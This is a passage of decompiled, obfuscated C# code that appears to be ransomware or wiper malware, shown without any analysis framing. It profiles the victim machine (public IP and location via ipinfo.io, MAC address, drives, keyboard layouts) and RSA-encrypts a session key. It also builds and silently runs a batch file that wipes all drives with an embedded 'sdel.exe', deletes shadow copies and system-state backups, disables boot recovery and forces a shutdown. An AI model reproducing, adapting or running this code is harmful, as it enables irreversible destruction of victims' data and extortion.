			class21_0.uint_0 = byte_[*(int*)((byte*)ptr + 8)] & 0xFFu;
			class21_0.int_2 = 8;
		}
		return *(int*)ptr + int_1;
	}

	unsafe static bool smethod_45()
	{
		void* ptr = stackalloc byte[9];
		try
		{
			string string_ = ":U";
			*(int*)ptr = 16;
			string text = Class16.smethod_49();
			if (text != null && !(text == ""))
			{
				if (text.Split(new char[1] { ',' })[0] == "")
				{
					Class6.Class7.smethod_9(string_);
				}
				else
				{
					Class6.Class7.smethod_9(text.Split(new char[1] { ',' })[0]);
				}
				if (text.Split(new char[1] { ',' })[1] == "")
				{
					Class6.Class7.smethod_11(string_);
				}
				else
				{
					Class6.Class7.smethod_11(text.Split(new char[1] { ',' })[1]);
				}
				if (text.Split(new char[1] { ',' })[2] == "")
				{
					Class6.Class7.smethod_17(string_);
				}
				else
				{
					Class6.Class7.smethod_17(text.Split(new char[1] { ',' })[2]);
				}
				if (text.Split(new char[1] { ',' })[3] == "")
				{
					Class6.Class7.smethod_15(string_);
				}
				else
				{
					Class6.Class7.smethod_15(text.Split(new char[1] { ',' })[3]);
				}
			}
			else
			{
				Class6.Class7.smethod_9(string_);
				Class6.Class7.smethod_11(string_);
				Class6.Class7.smethod_17(string_);
				Class6.Class7.smethod_15(string_);
			}
			string text2 = Class16.smethod_67();
			if (text2 != null)
			{
				Class6.Class7.smethod_13(text2);
			}
			else
			{
				Class6.Class7.smethod_13(string_);
			}
			Class6.Class7.smethod_7(Environment.OSVersion.ToString());
			string[] logicalDrives = Environment.GetLogicalDrives();
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < logicalDrives.Length)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[*(int*)((byte*)ptr + 4)]);
				Class6.Class7.smethod_19(Class6.Class7.smethod_18() + 1);
				if (driveInfo.IsReady)
				{
					if (driveInfo.DriveType == DriveType.Fixed)
					{
						Class6.Class7.smethod_21(Class6.Class7.smethod_20() + 1);
					}
					if (driveInfo.DriveType == DriveType.Network)
					{
						Class6.Class7.smethod_23(Class6.Class7.smethod_22() + 1);
					}
					Class6.Class7.smethod_25(Class6.Class7.smethod_24() + Convert.ToInt32((driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1000000000L));
				}
				(*(int*)((byte*)ptr + 4))++;
			}
			Class6.Class7.smethod_3(Class16.smethod_57(Class4.Class5.smethod_44()));
			Class6.Class7.smethod_5(Class16.smethod_57(*(int*)ptr));
			string s = $"{Class16.smethod_28(Class6.Class7.smethod_2())},{Class16.smethod_28(Class6.Class7.smethod_4())},{Class6.Class7.smethod_6()},{Class6.Class7.smethod_12()},{Class6.Class7.smethod_8()},{Class6.Class7.smethod_10()},{Class6.Class7.smethod_14()},{Class6.Class7.smethod_16()},{Class6.Class7.smethod_18()},{Class6.Class7.smethod_20()},{Class6.Class7.smethod_22()},{Class6.Class7.smethod_24()},{Class4.Class5.smethod_34()},{Class4.Class5.smethod_1()}";
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			byte[] array = Class16.smethod_57(Class4.Class5.smethod_42());
			bytes = Class16.smethod_14(bytes, array);
			array = Class16.smethod_79(Class4.Class5.smethod_38(), array);
			byte[] byte_ = Class16.smethod_70(new byte[2][] { bytes, array });
			if (array == null)
			{
				((byte*)ptr)[8] = 0;
			}
			else
			{
				Class6.Class7.smethod_1(Class16.smethod_16(Class16.smethod_4(byte_), 64));
				((byte*)ptr)[8] = 1;
			}
		}
		catch (Exception)
		{
			((byte*)ptr)[8] = 0;
		}
		return ((byte*)ptr)[8] != 0;
	}

	static int smethod_46(Class19.Class21 class21_0)
	{
		return class21_0.int_2;
	}

	static string smethod_47(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	static bool smethod_48(Class2 class2_0)
	{
		if ((class2_0.method_3() & Enum0.flag_2) != 0)
		{
			return false;
		}
		if ((class2_0.method_3() & Enum0.flag_3) != 0)
		{
			return false;
		}
		if ((class2_0.method_3() & Enum0.flag_1) != 0)
		{
			return false;
		}
		if ((class2_0.method_3() & Enum0.flag_4) == 0)
		{
			return true;
		}
		if (Enum0.flag_4 == class2_0.method_3() && !string.IsNullOrEmpty(class2_0.method_1()))
		{
			return true;
		}
		return false;
	}

	static string smethod_49()
	{
		string result = "";
		try
		{
			HttpWebRequest obj = (HttpWebRequest)WebRequest.Create("https://ipinfo.io/json");
			obj.Timeout = 5000;
			obj.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";
			HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
			string input = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding(httpWebResponse.CharacterSet)).ReadToEnd();
			result = string.Format("{0},{1},{2},{3}", Regex.Split(input, "\"ip\": \"")[1].Split(new char[1] { '"' })[0], Regex.Split(input, "\"org\": \"")[1].Split(new char[1] { '"' })[0], Regex.Split(input, "\"city\": \"")[1].Split(new char[1] { '"' })[0], Regex.Split(input, "\"country\": \"")[1].Split(new char[1] { '"' })[0]);
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	unsafe static int smethod_50(Class19.Class22 class22_0, Class19.Class21 class21_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class22_0.int_1), Class16.smethod_89(class21_0));
		*(int*)((byte*)ptr + 4) = 32768 - class22_0.int_0;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class16.smethod_44(class21_0, class22_0.byte_0, class22_0.int_0, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class16.smethod_44(class21_0, class22_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class16.smethod_44(class21_0, class22_0.byte_0, class22_0.int_0, int_0);
		}
		class22_0.int_0 = (class22_0.int_0 + *(int*)ptr) & 0x7FFF;
		class22_0.int_1 += *(int*)ptr;
		return *(int*)ptr;
	}

	static void smethod_51(Class19.Class22 class22_0, int int_0, int int_1)
	{
		if ((class22_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class22_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class22_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class22_0.byte_0, num, class22_0.byte_0, class22_0.int_0, int_0);
				class22_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class22_0.byte_0[class22_0.int_0++] = class22_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class16.smethod_77(class22_0, num, int_0, int_1);
		}
	}

	static int smethod_52(Class19.Class22 class22_0)
	{
		return 32768 - class22_0.int_1;
	}

	unsafe static void smethod_53(Class8.Class9.Class10 class10_0, byte[] byte_0, uint[] uint_0)
	{
		void* ptr = stackalloc byte[8];
		uint[] array = (uint[])uint_0.Clone();
		*(int*)ptr = class10_0.int_0;
		while (*(int*)ptr > 0)
		{
			array[4] ^= Class16.smethod_55(7, array[0] + array[12]);
			array[8] ^= Class16.smethod_55(9, array[4] + array[0]);
			array[12] ^= Class16.smethod_55(13, array[8] + array[4]);
			array[0] ^= Class16.smethod_55(18, array[12] + array[8]);
			array[9] ^= Class16.smethod_55(7, array[5] + array[1]);
			array[13] ^= Class16.smethod_55(9, array[9] + array[5]);
			array[1] ^= Class16.smethod_55(13, array[13] + array[9]);
			array[5] ^= Class16.smethod_55(18, array[1] + array[13]);
			array[14] ^= Class16.smethod_55(7, array[10] + array[6]);
			array[2] ^= Class16.smethod_55(9, array[14] + array[10]);
			array[6] ^= Class16.smethod_55(13, array[2] + array[14]);
			array[10] ^= Class16.smethod_55(18, array[6] + array[2]);
			array[3] ^= Class16.smethod_55(7, array[15] + array[11]);
			array[7] ^= Class16.smethod_55(9, array[3] + array[15]);
			array[11] ^= Class16.smethod_55(13, array[7] + array[3]);
			array[15] ^= Class16.smethod_55(18, array[11] + array[7]);
			array[1] ^= Class16.smethod_55(7, array[0] + array[3]);
			array[2] ^= Class16.smethod_55(9, array[1] + array[0]);
			array[3] ^= Class16.smethod_55(13, array[2] + array[1]);
			array[0] ^= Class16.smethod_55(18, array[3] + array[2]);
			array[6] ^= Class16.smethod_55(7, array[5] + array[4]);
			array[7] ^= Class16.smethod_55(9, array[6] + array[5]);
			array[4] ^= Class16.smethod_55(13, array[7] + array[6]);
			array[5] ^= Class16.smethod_55(18, array[4] + array[7]);
			array[11] ^= Class16.smethod_55(7, array[10] + array[9]);
			array[8] ^= Class16.smethod_55(9, array[11] + array[10]);
			array[9] ^= Class16.smethod_55(13, array[8] + array[11]);
			array[10] ^= Class16.smethod_55(18, array[9] + array[8]);
			array[12] ^= Class16.smethod_55(7, array[15] + array[14]);
			array[13] ^= Class16.smethod_55(9, array[12] + array[15]);
			array[14] ^= Class16.smethod_55(13, array[13] + array[12]);
			array[15] ^= Class16.smethod_55(18, array[14] + array[13]);
			*(int*)ptr -= 2;
		}
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < 16)
		{
			Class16.smethod_90(array[*(int*)((byte*)ptr + 4)] + uint_0[*(int*)((byte*)ptr + 4)], byte_0, 4 * *(int*)((byte*)ptr + 4));
			(*(int*)((byte*)ptr + 4))++;
		}
	}

	unsafe static void smethod_54(byte[] byte_0, Class19.Class23 class23_0)
	{
		void* ptr = stackalloc byte[64];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 16) = byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				array[*(int*)((byte*)ptr + 16)]++;
			}
			(*(int*)((byte*)ptr + 12))++;
		}
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 512;
		*(int*)((byte*)ptr + 20) = 1;
		while (*(int*)((byte*)ptr + 20) <= 15)
		{
			array2[*(int*)((byte*)ptr + 20)] = *(int*)ptr;
			*(int*)ptr += array[*(int*)((byte*)ptr + 20)] << 16 - *(int*)((byte*)ptr + 20);
			if (*(int*)((byte*)ptr + 20) >= 10)
			{
				*(int*)((byte*)ptr + 24) = array2[*(int*)((byte*)ptr + 20)] & 0x1FF80;
				*(int*)((byte*)ptr + 28) = *(int*)ptr & 0x1FF80;
				*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 28) - *(int*)((byte*)ptr + 24) >> 16 - *(int*)((byte*)ptr + 20);
			}
			(*(int*)((byte*)ptr + 20))++;
		}
		class23_0.short_0 = new short[*(int*)((byte*)ptr + 4)];
		*(int*)((byte*)ptr + 8) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)ptr & 0x1FF80;
			*(int*)ptr -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)ptr & 0x1FF80;
			while (*(int*)((byte*)ptr + 40) < *(int*)((byte*)ptr + 36))
			{
				class23_0.short_0[Class16.smethod_2(*(int*)((byte*)ptr + 40))] = (short)((-(*(int*)((byte*)ptr + 8)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 8) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 40) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 44) = 0;
		while (*(int*)((byte*)ptr + 44) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 48) = byte_0[*(int*)((byte*)ptr + 44)];
			if (*(int*)((byte*)ptr + 48) != 0)
			{
				*(int*)ptr = array2[*(int*)((byte*)ptr + 48)];
				*(int*)((byte*)ptr + 52) = Class16.smethod_2(*(int*)ptr);
				if (*(int*)((byte*)ptr + 48) <= 9)
				{
					do
					{
						class23_0.short_0[*(int*)((byte*)ptr + 52)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 56) = class23_0.short_0[*(int*)((byte*)ptr + 52) & 0x1FF];
					*(int*)((byte*)ptr + 60) = 1 << (*(int*)((byte*)ptr + 56) & 0xF);
					*(int*)((byte*)ptr + 56) = -(*(int*)((byte*)ptr + 56) >> 4);
					do
					{
						class23_0.short_0[*(int*)((byte*)ptr + 56) | (*(int*)((byte*)ptr + 52) >> 9)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
						*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
					}
					while (*(int*)((byte*)ptr + 52) < *(int*)((byte*)ptr + 60));
				}
				array2[*(int*)((byte*)ptr + 48)] = *(int*)ptr + (1 << 16 - *(int*)((byte*)ptr + 48));
			}
			(*(int*)((byte*)ptr + 44))++;
		}
	}

	static uint smethod_55(int int_0, uint uint_0)
	{
		return (uint_0 << int_0) | (uint_0 >> 32 - int_0);
	}

	static int smethod_56(Class19.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static byte[] smethod_57(int int_0)
	{
		byte[] array = new byte[int_0];
		new RNGCryptoServiceProvider().GetNonZeroBytes(array);
		return array;
	}

	unsafe static string[] smethod_58(string string_0)
	{
		void* ptr = stackalloc byte[6];
		string[] array = new string[2];
		((byte*)ptr)[4] = 0;
		((byte*)ptr)[5] = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < string_0.Length && ((byte*)ptr)[5] == 0)
		{
			if (string_0[*(int*)ptr] == '"' && (*(int*)ptr == 0 || string_0[*(int*)ptr - 1] != '\\'))
			{
				if (((byte*)ptr)[4] == 0)
				{
					((byte*)ptr)[4] = 1;
					(*(int*)ptr)++;
				}
				else
				{
					array[0] = string_0.Substring(1, *(int*)ptr - 1);
					array[1] = string_0.Substring(*(int*)ptr + 2);
					((byte*)ptr)[5] = 1;
				}
			}
			else
			{
				(*(int*)ptr)++;
			}
		}
		return array;
	}

	unsafe static string smethod_59(JsonNode jsonNode_0)
	{
		void* ptr = stackalloc byte[9];
		string text = jsonNode_0.vmethod_0();
		string text2 = string.Empty;
		*(int*)ptr = 0;
		while (*(int*)ptr < 1)
		{
			text2 += "\t";
			(*(int*)ptr)++;
		}
		((byte*)ptr)[8] = 0;
		string text3 = string.Empty;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < text.Length)
		{
			switch (text[*(int*)((byte*)ptr + 4)])
			{
			case ':':
				if (((byte*)ptr)[8] == 0)
				{
					text = text.Insert(*(int*)((byte*)ptr + 4) + 1, " ");
				}
				break;
			case ',':
				if (((byte*)ptr)[8] == 0)
				{
					text = text.Insert(*(int*)((byte*)ptr + 4) + 1, "\n" + text3);
				}
				break;
			case '"':
				if (*(int*)((byte*)ptr + 4) == 0 || text[*(int*)((byte*)ptr + 4) - 1] != '\\')
				{
					((byte*)ptr)[8] = ((((byte*)ptr)[8] == 0) ? ((byte)1) : ((byte)0));
				}
				break;
			case ']':
			case '}':
				if (((byte*)ptr)[8] == 0)
				{
					text3 = text3.Substring(0, text3.Length - text2.Length);
					text = text.Insert(*(int*)((byte*)ptr + 4), "\n" + text3);
					*(int*)((byte*)ptr + 4) += text3.Length + 1;
				}
				break;
			case '[':
			case '{':
				if (((byte*)ptr)[8] == 0)
				{
					text3 += text2;
					text = text.Insert(*(int*)((byte*)ptr + 4) + 1, "\n" + text3);
				}
				break;
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		return text;
	}

	unsafe static string smethod_60(string string_0)
	{
		void* ptr = stackalloc byte[9];
		*(int*)ptr = string_0.Length;
		char[] array = new char[*(int*)ptr];
		int length = 0;
		((byte*)ptr)[8] = 1;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			char c = string_0[*(int*)((byte*)ptr + 4)];
			if (c == '"' && (*(int*)((byte*)ptr + 4) == 0 || string_0[*(int*)((byte*)ptr + 4) - 1] != '\\'))
			{
				((byte*)ptr)[8] = ((((byte*)ptr)[8] == 0) ? ((byte)1) : ((byte)0));
			}
			if (((byte*)ptr)[8] == 0 || (c != ' ' && c != '\r' && c != '\n' && c != '\t' && c != '\b' && c != '\f'))
			{
				array[length++] = c;
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		return new string(array, 0, length);
	}

	static void smethod_61(byte[] byte_0, byte[] byte_1, Class8.Class9.Class10 class10_0)
	{
		class10_0.uint_0 = new uint[16];
		class10_0.uint_0[1] = Class16.smethod_29(byte_1, 0);
		class10_0.uint_0[2] = Class16.smethod_29(byte_1, 4);
		class10_0.uint_0[3] = Class16.smethod_29(byte_1, 8);
		class10_0.uint_0[4] = Class16.smethod_29(byte_1, 12);
		byte[] byte_2 = ((byte_1.Length == 32) ? Class8.Class9.Class10.byte_0 : Class8.Class9.Class10.byte_1);
		int num = byte_1.Length - 16;
		class10_0.uint_0[11] = Class16.smethod_29(byte_1, num);
		class10_0.uint_0[12] = Class16.smethod_29(byte_1, num + 4);
		class10_0.uint_0[13] = Class16.smethod_29(byte_1, num + 8);
		class10_0.uint_0[14] = Class16.smethod_29(byte_1, num + 12);
		class10_0.uint_0[0] = Class16.smethod_29(byte_2, 0);
		class10_0.uint_0[5] = Class16.smethod_29(byte_2, 4);
		class10_0.uint_0[10] = Class16.smethod_29(byte_2, 8);
		class10_0.uint_0[15] = Class16.smethod_29(byte_2, 12);
		class10_0.uint_0[6] = Class16.smethod_29(byte_0, 0);
		class10_0.uint_0[7] = Class16.smethod_29(byte_0, 4);
		class10_0.uint_0[8] = 0u;
		class10_0.uint_0[9] = 0u;
	}

	static byte[] smethod_62()
	{
		return (byte[])Class16.smethod_63().GetObject("data", Class14.cultureInfo_0);
	}

	static ResourceManager smethod_63()
	{
		if (Class14.resourceManager_0 == null)
		{
			Class14.resourceManager_0 = new ResourceManager("ns1.Class14", typeof(Class14).Assembly);
		}
		return Class14.resourceManager_0;
	}

	static bool smethod_64(Assembly assembly_0, Assembly assembly_1)
	{
		return true;
	}

	static string smethod_65(JsonNode jsonNode_0)
	{
		return jsonNode_0?.ToString();
	}

	static ICryptoTransform smethod_66(byte[] byte_0, byte[] byte_1, bool bool_0)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	unsafe static string smethod_67()
	{
		void* ptr = stackalloc byte[8];
		string empty = string.Empty;
		try
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			*(int*)ptr = 0;
			while (*(int*)ptr < allNetworkInterfaces.Length)
			{
				NetworkInterface networkInterface = allNetworkInterfaces[*(int*)ptr];
				if (networkInterface.OperationalStatus != OperationalStatus.Up)
				{
					(*(int*)ptr)++;
					continue;
				}
				empty += networkInterface.GetPhysicalAddress().ToString();
				string[] array = new string[empty.Length];
				*(int*)((byte*)ptr + 4) = 0;
				while (*(int*)((byte*)ptr + 4) < empty.Length)
				{
					array[*(int*)((byte*)ptr + 4)] = Encoding.UTF8.GetBytes(empty)[*(int*)((byte*)ptr + 4)].ToString("x2");
					(*(int*)((byte*)ptr + 4))++;
				}
				return string.Join(":", array);
			}
			return empty;
		}
		catch (Exception)
		{
			return null;
		}
	}

	static int smethod_68(Class19.Class22 class22_0)
	{
		return class22_0.int_1;
	}

	static void smethod_69()
	{
		string text = "Release.bat";
		try
		{
			string text2 = $"{Environment.SystemDirectory.Substring(0, 1)}:\\ProgramData\\";
			string text3 = "@echo off" + Environment.NewLine;
			string[] logicalDrives = Environment.GetLogicalDrives();
			foreach (string text4 in logicalDrives)
			{
				if ((new DriveInfo(text4).IsReady && new DriveInfo(text4).DriveType != DriveType.CDRom) || new DriveInfo(text4).DriveType != 0)
				{
					text3 = ((!(text4.Substring(0, 1) == Environment.SystemDirectory.Substring(0, 1))) ? (text3 + $"cmd.exe /c {text2}sdel.exe -z {text4.Substring(0, 1)}:{Environment.NewLine}") : (text3 + $"cmd.exe /c {text2}sdel.exe -c -z {text4.Substring(0, 1)}:{Environment.NewLine}"));
				}
			}
			text3 = text3 + "del " + text2 + "sdel.exe" + Environment.NewLine + "del " + text2 + "release.bat" + Environment.NewLine + "shutdown /S /F /T 120" + Environment.NewLine + "wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0" + Environment.NewLine + "bcdedit /set {default} recoveryenabled No && bcdedit /set {default} bootstatuspolicy ignoreallfailures" + Environment.NewLine + "wmic SHADOWCOPY DELETE && vssadmin delete shadows /All";
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			File.WriteAllBytes(text2 + "sdel.exe", Class16.smethod_71());
			File.WriteAllText(text2 + text, text3);
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo(text2 + text)
			{
				CreateNoWindow = true,
				RedirectStandardOutput = true,
				UseShellExecute = false
			};
			process.Start();
		}
		catch (Exception)
		{
		}
	}

	unsafe static byte[] smethod_70(byte[][] byte_0)
	{
		void* ptr = stackalloc byte[8];
		byte[] array = new byte[byte_0.Sum((byte[] byte_0) => byte_0.Length)];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < byte_0.Length)
		{
			byte[] array2 = byte_0[*(int*)((byte*)ptr + 4)];
			Buffer.BlockCopy(array2, 0, array, *(int*)ptr, array2.Length);
			*(int*)ptr += array2.Length;
			(*(int*)((byte*)ptr + 4))++;
		}
		return array;
	}

	static byte[] smethod_71()
	{
		return (byte[])Class16.smethod_63().GetObject("sdel", Class14.cultureInfo_0);
	}

	static void smethod_72(string string_0, byte[] byte_0, byte[] byte_1)
	{
		Class16.smethod_33(string_0);
		if (!Class4.Class5.smethod_28())
		{
			Class16.smethod_11(byte_1, byte_0);
		}
	}

	static int smethod_73(Class19.Stream0 stream0_0)
	{
		return Class16.smethod_56(stream0_0) | (Class16.smethod_56(stream0_0) << 16);
	}

	static byte[] smethod_74(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		try
		{
			using Class8.Class9 @class = new Class8.Class9();
			using MemoryStream memoryStream = new MemoryStream();
			@class.Key = byte_2;
			@class.IV = byte_0;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, @class.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_1, 0, byte_1.Length);
			}
			return memoryStream.ToArray();
		}
		catch (Exception)
		{
			return null;
		}
	}

	static string smethod_75()
	{
		string text = "";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Keyboard Layout\\Preload");
			string[] valueNames = registryKey.GetValueNames();
			foreach (string name in valueNames)
			{
				text = text + $"{Class16.smethod_76((string)registryKey.GetValue(name))}" + ",";
			}
		}
		catch (Exception)
		{
		}
		return text.TrimEnd(new char[1] { ',' });
	}

	static int smethod_76(string string_0)
	{
		try
		{
			return Convert.ToInt32(string_0, 16);
		}
		catch (Exception)
		{
			return -1;
		}
	}

	static void smethod_77(Class19.Class22 class22_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class22_0.byte_0[class22_0.int_0++] = class22_0.byte_0[int_0++];
			class22_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static object smethod_78(JsonBasic jsonBasic_0)
	{
		return jsonBasic_0.m_value;
	}

	static byte[] smethod_79(string string_0, byte[] byte_0)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		try
		{
			rSACryptoServiceProvider.FromXmlString($"<RSAKeyValue><Modulus>{string_0}</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			return rSACryptoServiceProvider.Encrypt(byte_0, fOAEP: true);
		}
		catch (Exception)
		{
		}
		finally
		{
			rSACryptoServiceProvider.Clear();
		}
		return null;
	}

	static byte[] smethod_80(byte[] byte_0, int int_0, byte[] byte_1, int int_1)
	{
		try
		{
			return new Rfc2898DeriveBytes(byte_1, byte_0, int_1).GetBytes(int_0);
		}
		catch (Exception)
		{
			return null;
		}
	}

	static byte[] smethod_81(int int_0)
	{
		return Class16.smethod_57(int_0);
	}

	static bool smethod_82(string string_0)
	{
		if (string.IsNullOrEmpty(string_0))
		{
			return false;
		}
		char c = char.ToUpper(string_0[0]);
		if ('A' <= c && c <= 'Z')
		{
			if (Path.VolumeSeparatorChar != string_0[1])
			{
				return false;
			}
			if (Path.DirectorySeparatorChar != string_0[2])
			{
				return false;
			}
			return true;
		}
		return false;
	}

	static string smethod_83(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	unsafe static bool smethod_84(Class19.Class20 class20_0)
	{
		void* ptr = stackalloc byte[8];
		switch (class20_0.int_4)
		{
		case 2:
			if (class20_0.bool_0)
			{
				class20_0.int_4 = 12;
				return false;
			}
			*(int*)ptr = Class16.smethod_93(class20_0.class21_0, 3);
			if (*(int*)ptr < 0)
			{
				return false;
			}
			Class16.smethod_96(class20_0.class21_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class20_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class16.smethod_88(class20_0.class21_0);
				class20_0.int_4 = 3;
				break;
			case 1:
				class20_0.class23_0 = Class19.Class23.class23_0;
				class20_0.class23_1 = Class19.Class23.class23_1;
				class20_0.int_4 = 7;
				break;
			case 2:
				class20_0.class24_0 = new Class19.Class24();
				class20_0.int_4 = 6;
				break;
			}
			return true;
		case 3:
			if ((class20_0.int_8 = Class16.smethod_93(class20_0.class21_0, 16)) < 0)
			{
				return false;
			}
			Class16.smethod_96(class20_0.class21_0, 16);
			class20_0.int_4 = 4;
			goto case 4;
		case 4:
			if (Class16.smethod_93(class20_0.class21_0, 16) < 0)
			{
				return false;
			}
			Class16.smethod_96(class20_0.class21_0, 16);
			class20_0.int_4 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 4) = Class16.smethod_50(class20_0.class22_0, class20_0.class21_0, class20_0.int_8);
			class20_0.int_8 -= *(int*)((byte*)ptr + 4);
			if (class20_0.int_8 == 0)
			{
				class20_0.int_4 = 2;
				return true;
			}
			return !Class16.smethod_18(class20_0.class21_0);
		case 6:
			if (!Class16.smethod_95(class20_0.class24_0, class20_0.class21_0))
			{
				return false;
			}
			class20_0.class23_0 = Class16.smethod_32(class20_0.class24_0);
			class20_0.class23_1 = Class16.smethod_26(class20_0.class24_0);
			class20_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class16.smethod_30(class20_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static float smethod_85(JsonNode jsonNode_0)
	{
		return (float)Convert.ChangeType(((JsonBasic)jsonNode_0).m_value, typeof(float));
	}

	unsafe static int smethod_86(byte[] byte_0, int int_0, int int_1, Class19.Class20 class20_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		do
		{
			if (class20_0.int_4 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class16.smethod_40(int_1, int_0, class20_0.class22_0, byte_0);
				int_1 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_0 -= *(int*)((byte*)ptr + 4);
				if (int_0 == 0)
				{
					return *(int*)ptr;
				}
			}
		}
		while (Class16.smethod_84(class20_0) || (class20_0.class22_0.int_1 > 0 && class20_0.int_4 != 11));
		return *(int*)ptr;
	}

	static bool smethod_87()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		if (PlatformID.Win32NT == oSVersion.Platform && oSVersion.Version.Major >= 5)
		{
			return true;
		}
		return false;
	}

	static void smethod_88(Class19.Class21 class21_0)
	{
		class21_0.uint_0 >>= class21_0.int_2 & 7;
		class21_0.int_2 &= -8;
	}

	static int smethod_89(Class19.Class21 class21_0)
	{
		return class21_0.int_1 - class21_0.int_0 + (class21_0.int_2 >> 3);
	}

	static void smethod_90(uint uint_0, byte[] byte_0, int int_0)
	{
		byte_0[int_0] = (byte)uint_0;
		byte_0[int_0 + 1] = (byte)(uint_0 >> 8);
		byte_0[int_0 + 2] = (byte)(uint_0 >> 16);
		byte_0[int_0 + 3] = (byte)(uint_0 >> 24);
	}

	unsafe static void smethod_91(string string_0, Class3 class3_0)
	{
		void* ptr = stackalloc byte[32];
		*(int*)ptr = 2;
		*(int*)((byte*)ptr + 4) = 0;
